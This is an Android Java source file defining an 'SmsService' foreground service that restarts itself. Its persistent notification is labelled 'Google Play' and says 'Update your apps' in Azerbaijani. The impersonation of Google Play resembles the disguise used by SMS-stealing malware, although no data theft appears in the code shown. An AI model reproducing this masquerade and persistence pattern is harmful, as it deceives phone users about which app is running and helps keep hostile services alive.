package com.example.myapp;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

public class SmsService extends Service {

    private static final String TAG = "SmsService";
    private static final String CHANNEL_ID = "SmsServiceChannel";

    @SuppressLint("ForegroundServiceType")
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service created");
        createNotificationChannel();
        startForeground(1, getNotification());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service started");
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service destroyed");
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        Log.d(TAG, "Creating notification channel");
        NotificationChannel serviceChannel = new NotificationChannel(
                CHANNEL_ID,
                "Sms Service Channel",
                NotificationManager.IMPORTANCE_DEFAULT
        );
        NotificationManager manager = getSystemService(NotificationManager.class);
        if (manager != null) {
            manager.createNotificationChannel(serviceChannel);
        }
    }

    private Notification getNotification() {
        Log.d(TAG, "Creating notification");
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Google Play")
                .setContentText("Tətbiqlərinizi yeniləyin")
                .setSmallIcon(R.drawable.alert)
                .build();
    }
}